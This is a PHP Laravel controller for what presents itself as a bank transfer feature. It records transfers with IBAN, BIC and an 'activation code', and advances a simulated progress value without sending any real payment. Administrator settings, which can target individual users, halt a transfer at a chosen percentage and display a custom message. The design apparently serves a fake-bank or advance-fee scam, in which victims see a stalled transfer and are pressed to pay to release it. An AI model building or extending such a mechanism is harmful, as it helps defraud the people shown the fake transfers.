<?php

namespace App\Http\Controllers;

use App\Http\Requests\TransferRequest;
use App\Models\Setting;
use App\Models\Transaction;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Barryvdh\DomPDF\Facade\Pdf;

class TransactionController extends Controller
{
    public function create()
    {
        return view('transactions.create');
    }

    public function start(TransferRequest $request)
    {
        $user = auth()->user();

        $transaction = Transaction::create([
            'user_id' => $user->id,
            'amount' => $request->amount,
            'type' => 'transfer',
            'recipient_name' => $request->recipient_name,
            'recipient_iban' => $request->recipient_iban,
            'recipient_bic' => $request->recipient_bic,
            'bank_name' => $request->bank_name,
            'reason' => $request->reason,
            'activation_code' => $request->activation_code,
            'status' => 'pending',
            'progress' => 1,
        ]);

        return response()->json(['tx_id' => $transaction->id]);
    }

    public function progress(Request $request)
    {
        $tx = Transaction::where('id', $request->tx_id)
            ->where('user_id', auth()->id())
            ->firstOrFail();

        // Priorité : settings spécifiques à l'utilisateur, sinon global
        $settings = Setting::where('target_user_id', auth()->id())
            ->where('is_global', false)
            ->first();

        if (!$settings) {
            $settings = Setting::where('is_global', true)->firstOrFail();
        }
        $increment = 1; // pas de progression
        $p = min(100, (int)$tx->progress + $increment);

        if ($tx->status === 'pending') {
            if ($p >= (int)$settings->stop_percentage && (int)$settings->stop_percentage > 0) {
                $tx->update([
                    'progress' => $settings->stop_percentage,
                    'status'   => 'on_hold',
                    'message'  => $settings->stop_message,
                ]);
                return response()->json([
                    'status' => 'on_hold',
                    'progress' => (int)$settings->stop_percentage,
                    'message' => $settings->stop_message,
                ]);
            }

            if ($p >= 100) {
                DB::transaction(function () use ($tx) {
                    $user = $tx->user()->lockForUpdate()->first();
                    $user->balance = $user->balance - $tx->amount;
                    $user->save();
                    $tx->update(['progress' => 100, 'status' => 'success']);
                });

                // Send confirmation email
                try {
                    \Illuminate\Support\Facades\Mail::to($tx->user->email)->send(new \App\Mail\TransferConfirmationMail($tx));
                } catch (\Exception $e) {
                    \Illuminate\Support\Facades\Log::error('Failed to send transfer confirmation email', [
                        'transaction_id' => $tx->id,
                        'user_id' => $tx->user->id,
                        'error' => $e->getMessage(),
                    ]);
                }

                return response()->json(['status' => 'success', 'progress' => 100]);
            }

            $tx->update(['progress' => $p]);
            return response()->json(['status' => 'pending', 'progress' => $p]);
        }

        // Déjà on_hold ou success → renvoyer l'état courant
        return response()->json([
            'status' => $tx->status,
            'progress' => (int)$tx->progress,
            'message' => $tx->message
        ]);
    }

    public function history()
    {
        $transactions = auth()->user()->transactions()->latest()->paginate(10);
        return view('transactions.history', compact('transactions'));
    }

    public function receiptPdf(Transaction $transaction)
    {
        if ($transaction->user_id !== auth()->id()) {
            abort(403);
        }

        $pdf = Pdf::loadView('transactions.receipt', compact('transaction'));
        return $pdf->download('receipt_' . $transaction->id . '.pdf');
    }
}
